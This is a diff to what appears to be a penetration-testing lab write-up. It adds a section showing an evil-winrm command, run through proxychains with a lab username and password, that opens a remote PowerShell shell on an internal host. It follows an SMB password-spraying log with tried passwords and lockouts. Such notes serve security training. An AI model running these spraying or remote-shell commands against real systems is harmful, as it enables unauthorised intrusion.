@@ -526,3 +526,19 @@ SMB         172.16.193.82   445    CLIENT01         [-] medtech.com\yoshi:lab ST
 SMB         172.16.193.82   445    CLIENT01         [-] medtech.com\yoshi:Flowers1 STATUS_ACCOUNT_LOCKED_OUT 
 SMB         172.16.193.82   445    CLIENT01         [-] medtech.com\yoshi:Mushroom! STATUS_ACCOUNT_LOCKED_OUT 
 ```
+
+### evil-winrm
+
+```
+┌──(rnozaka㉿rnozaka)-[~/Documents/Callenge1]
+└─$ proxychains -q evil-winrm -i 172.16.193.83 -u wario -p 'Mushroom!'
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\wario\Documents> 
+```
